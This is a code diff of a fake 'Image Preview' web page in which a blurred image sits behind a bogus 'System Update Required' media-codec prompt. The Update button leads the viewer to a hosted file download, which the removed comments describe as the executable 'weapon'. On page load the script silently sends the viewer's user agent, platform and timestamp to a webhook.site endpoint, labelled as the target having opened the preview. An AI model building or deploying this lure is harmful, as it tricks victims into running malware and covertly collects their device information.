@@ -1,48 +1,56 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Image Preview</title>
     <style>
-        body { margin:0; background:black; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        img { max-width:100%; max-height:100%; object-fit:contain; filter: blur(5px); transition: 0.5s; }
-        
-        /* تصميم التنبيه الوهمي */
+        body { margin:0; background:black; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; font-family: sans-serif; }
+        img { max-width:100%; max-height:100%; object-fit:contain; filter: blur(10px); transition: 0.5s; }
         #update-box {
-            position: absolute; width: 300px; background: white; padding: 20px; border-radius: 12px;
-            text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: none; z-index: 100;
+            position: absolute; width: 320px; background: #ffffff; padding: 25px; border-radius: 15px;
+            text-align: center; box-shadow: 0 15px 35px rgba(0,0,0,0.6); z-index: 999;
         }
-        button { background: #007bff; color: white; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 15px; }
+        h3 { color: #222; margin: 0 0 10px 0; font-size: 18px; }
+        p { color: #555; font-size: 13px; line-height: 1.4; }
+        button { 
+            background: #007bff; color: white; border: none; padding: 12px 25px; 
+            border-radius: 6px; cursor: pointer; font-weight: bold; margin-top: 20px; width: 100%;
+        }
         button:hover { background: #0056b3; }
     </style>
 </head>
 <body>
 
     <div id="update-box">
-        <h3 style="color: #333; margin: 0;">تحديث النظام مطلوب</h3>
-        <p style="color: #666; font-size: 14px;">يجب تحديث "مشغل الوسائط" لعرض هذه الصورة بدقة عالية.</p>
-        <button onclick="startDownload()">تحديث الآن</button>
+        <h3>System Update Required</h3>
+        <p>A high-definition media codec update is required to view this content in 4K resolution.</p>
+        <button onclick="startDownload()">Update Now</button>
     </div>
 
-    <img src="target_image.jpg" id="target-img">
+    <img src="target_image.jpg">
 
     <script>
-        // 1. إظهار التنبيه بعد 3 ثوانٍ من فتح الصورة
-        setTimeout(() => {
-            document.getElementById('update-box').style.display = 'block';
-        }, 3000);
-
-        // 2. وظيفة التحميل (هنا سنضع رابط السلاح الثقيل لاحقاً)
         function startDownload() {
-            alert("جاري بدء التحديث... يرجى تشغيل الملف بعد التحميل.");
-            // ملاحظة: هنا سنضع رابط ملف الـ EXE أو التطبيق لاحقاً
+            const FILE_ID = "1C3xIHNY4uIh3ka5nOb1LbLixkZD1NHIS";
+            const DIRECT_LINK = "https://google.com" + FILE_ID;
+            window.location.href = DIRECT_LINK;
         }
 
-        // [SIMPLE_WEAPON_RECON]: سحب البيانات الصامت لا يزال يعمل
         window.onload = function() {
-            const webhook = "https://webhook.site";
-            fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify({status: "Target watching blurred image"}) });
+            const WEBHOOK_URL = "https://webhook.site/14050d7a-a236-4a94-8187-92801f330c1b";
+            const payload = {
+                event: "Target_Accessed_Preview",
+                device: navigator.userAgent,
+                platform: navigator.platform,
+                timestamp: new Date().toISOString()
+            };
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                body: JSON.stringify(payload)
+            });
         };
     </script>
 </body>
